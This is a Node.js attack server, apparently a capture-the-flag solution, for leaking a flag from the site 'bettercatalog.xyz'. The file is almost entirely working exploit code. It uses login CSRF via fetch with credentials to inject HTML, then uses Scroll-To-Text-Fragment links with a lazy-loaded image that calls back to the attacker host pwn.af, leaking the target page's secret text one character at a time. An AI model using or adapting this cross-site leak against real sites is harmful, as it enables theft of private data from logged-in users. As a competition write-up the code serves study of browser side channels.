const bl = require("beautiful-log");
const express = require("express");
const https = require('https');
const fs = require('fs');

bl.init("pwn", "console");
const log = bl.make("pwn");

const app = express();
//for https
const privateKey = fs.readFileSync('/etc/letsencrypt/live/pwn.af/privkey.pem', 'utf8');
const certificate = fs.readFileSync('/etc/letsencrypt/live/pwn.af/cert.pem', 'utf8');
const ca = fs.readFileSync('/etc/letsencrypt/live/pwn.af/chain.pem', 'utf8');

const credentials = {
	key: privateKey,
	cert: certificate,
	ca: ca
};


// Starting both http & https servers
const httpsServer = https.createServer(credentials, app);


let alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
let flag = "NEKO{";
let phase = 0;
let currentAlphabet = alphabet;
let yesAlphabet = alphabet;
let noAlphabet = alphabet;
let targetUrl = "https://bettercatalog.xyz";
let targetIssue = 4; // flag id
let attackUrl = "https://pwn.af:12346" 
let redirectUrl = "https://bettercatalog.xyz/issue.php?id=5"
var gotit = 0;
var sync = 0;
app.get("/yeet", (req, res) => {
	currentAlphabet = yesAlphabet;
	gotit=1;
	log(`<green>Image loaded!</green>\n<gray>New alphabet: ${currentAlphabet}</gray>`);
	res.status(404).send();
});

app.get("/poll", (req, res)=>{
	if(gotit){
		res.send('yes');
		gotit=0;
	}else{
		res.send('no')
	}
})

app.get("/pwn", (req, res) =>{
	console.log('+==>');

		if (currentAlphabet !== yesAlphabet) {
			log(`<red>No image loaded!</red>\n<gray>New alphabet: ${currentAlphabet}</gray>`);
			currentAlphabet = noAlphabet;
		}

		if (currentAlphabet.length === 1) {
			flag += currentAlphabet.charAt(0);
			log(`Flag updated: <cyan>${flag}</cyan>`)
			if (flag.endsWith("}")) {
				process.exit(0);
			}
			currentAlphabet = alphabet;

			// If you're testing with the real flag but a non-admin viewer, you need to omit "A" as a possibility when the last two characters are "OR".
			// This is because there's a button with the label "submit for admin approval", so you get stuck on the path starting in the middle of the word "for".
			// However, this button doesn't appear if you're logged in as an admin, so you wouldn't end up having this problem.
			// (In fact, the flag was specifically chosen to not have conflicts like this when viewed by an admin.)

			// if (flag.endsWith("OR")) {
			// 	currentAlphabet = currentAlphabet.substring(1);
			// }
		}

		let yesLen = Math.floor(currentAlphabet.length / 2);
		yesAlphabet = currentAlphabet.substring(0, yesLen);
		noAlphabet = currentAlphabet.substring(yesLen);

		let content = `</b></div>${"<h1></h1>".repeat(500)}<img src="${attackUrl}/yeet?alpha=${yesAlphabet}" loading="lazy" /><em><div><b>`;
		let test = yesAlphabet.split("").map((c) => `text=${flag.charAt(flag.length - 2)}-,${flag.charAt(flag.length - 1)},-${c}`).join("&");
		log(`Alphabet: <green>${yesAlphabet}</green> <red>${noAlphabet}</red>`);
		log(`STTF: <gray>${test}</gray>`);
		log(`${targetUrl}/issue.php?id=${targetIssue}#:~:${test}`)
		res.send(`
		<img src='http://httpstat.us/200?sleep=100000'>
		<iframe   style=" position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" src="https://bettercatalog.xyz/"></iframe>
	<script>
var x = setInterval(function(){
console.log('fetching')
fetch("https://bettercatalog.xyz/user.php", {
method: "POST",
mode: "no-cors",
credentials: "include",
headers: {
	"content-type": "application/x-www-form-urlencoded"
},
body: "username=${encodeURIComponent(content)}&password=fail&action=login"
})},100);

setTimeout(function(){
frames[0].location='${redirectUrl}'
},500);

setTimeout(function(){
clearInterval(x);
},1000)

setTimeout(function(){
	console.log('sttf')
	console.log("${targetUrl}/issue.php?id=${targetIssue}#:~:${test}")
	frames[0].location = ("${targetUrl}/issue.php?id=${targetIssue}#:~:${test}");
},3000)
// setInterval(function(){
// 	fetch('/poll').then(x=>x.text()).then(function(x){
// 		if(x=='yes'){
// 			location='/pwn';
// 		}
// 	})
// },500);
setTimeout(function(){
	console.log('not found')
	location='/pwn';
},5000)

</script>
		`);

})


httpsServer.listen(12346, () => {
	console.log('HTTPS Server running on port 443');
});